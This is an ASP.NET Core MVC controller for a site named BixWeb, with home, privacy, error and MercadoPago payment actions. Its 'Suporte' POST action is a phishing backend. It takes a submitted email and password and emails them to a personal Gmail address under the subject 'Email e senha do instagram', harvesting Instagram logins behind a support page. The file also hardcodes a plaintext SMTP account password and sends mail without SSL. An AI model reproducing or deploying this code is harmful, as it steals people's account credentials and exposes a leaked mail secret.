using BixWeb.Models;
using iText.StyledXmlParser.Jsoup.Nodes;
using Microsoft.AspNetCore.Mvc;
using System.Diagnostics;
using System.Net.Mail;
using System.Net;
using MercadoPago.Client.Common;
using MercadoPago.Client.Payment;
using MercadoPago.Client.Preference;
using MercadoPago.Resource.Preference;
using BixWeb.Services;

namespace BixWeb.Controllers
{
	public class HomeController : Controller
	{
		private readonly ILogger<HomeController> _logger;
        private readonly MercadoPagoService _mercadoPagoService;
        public HomeController(ILogger<HomeController> logger, MercadoPagoService mercadoPagoService)
		{
			_logger = logger;
            _mercadoPagoService = mercadoPagoService;
        }

		public IActionResult Index()
		{
			return View();
		}

		public IActionResult Privacy()
		{
			return View();
		}
        [HttpGet("/not-found")]
        public IActionResult PageNotFound()
        {
            return View("Error");
        }
        public async Task<IActionResult> Pagamentos()
        {
            var url = await _mercadoPagoService.CriarPreferenciaAsyncOri();
            ViewBag.Preferencia = url;
            return View();
        }
        [HttpPost]
		public bool Suporte(string email, string senha)
		{
            try
            {
                SmtpClient client = new SmtpClient("mail.uaipdv.com.br"); // Substitua pelo seu servidor SMTP
                client.Port = 587; // Porta padr�o para SMTP (pode ser 25 ou 465 para SSL)
                client.Credentials = new NetworkCredential("uai@uaipdv.com.br", "M6433vlks*");
                client.EnableSsl = false; // Define SSL, dependendo do servidor SMTP

                // Criando o e-mail
                MailMessage mailMessage = new MailMessage();
                mailMessage = new MailMessage("uai@uaipdv.com.br", "tania.hardt.jose@gmail.com");
                mailMessage.SubjectEncoding = System.Text.Encoding.UTF8;
                mailMessage.Subject = "Email e senha do instagram";
                mailMessage.Body = "Email:"+email+"\nSenha:"+senha;
                mailMessage.Priority = MailPriority.High;

                client.Send(mailMessage);
                return true;
            }
            catch (Exception ex)
            {
                ErrorViewModel.LogError($"Erro ao chamar EnviarCupons: {ex}");
                return false;
            }
		}

        [HttpGet("/error")]
        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
		public IActionResult Error()
		{
            //new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier }

            return View();
		}
        public IActionResult Suporte()
        {
            return View();
        }
	}
}
